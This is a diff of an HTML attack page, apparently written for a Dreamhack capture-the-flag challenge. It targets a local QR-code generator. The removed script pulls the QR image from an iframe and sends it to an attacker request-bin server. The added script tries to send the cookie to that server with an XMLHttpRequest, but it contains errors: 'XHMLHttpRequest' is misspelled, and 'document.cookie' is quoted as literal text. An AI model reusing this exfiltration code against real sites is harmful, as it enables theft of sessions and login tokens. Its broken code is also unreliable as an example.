@@ -9,31 +9,12 @@
     <iframe id="qrFrame" src="http://127.0.0.1:10023/generate_qr_code"></iframe>
     
     <script>
+        const Http = new XHMLHttpRequest();
         const attackServer = "https://dkguxwl.request.dreamhack.games";  // 공격자의 서버
         const fail = "fail extractQRCode..."
-        // QR 코드 정보를 얻기 위한 함수
-        function extractQRCodeFromIframe() {
-            const qrFrame = document.getElementById('qrFrame');
-            const qrDoc = qrFrame.contentDocument || qrFrame.contentWindow.document;
-            const qrImage = qrDoc.querySelector('img');
-            
-            if (qrImage) {
-                const qrCodeSrc = qrImage.src;
-                sendQRCodeToAttackServer(qrCodeSrc);
-            } else {
-                sendQRCodeToAttackServer(fail);
-            }
-        }
-
-        // 공격자의 서버로 QR 코드 정보를 전송하는 함수
-        function sendQRCodeToAttackServer(qrCodeSrc) {
-            const attackUrl = `${attackServer}?qr_code=${encodeURIComponent(qrCodeSrc)}`;
-            const attackIframe = document.createElement('iframe');
-            attackIframe.src = attackUrl;
-            document.body.appendChild(attackIframe);
-        }
-
-        document.getElementById('qrFrame').onload = extractQRCodeFromIframe;
+        const url = `${attackServer}?qr_code=document.cookie`;
+        Http.open('GET', url);
+        Http.send();
     </script>
 </body>
 </html>
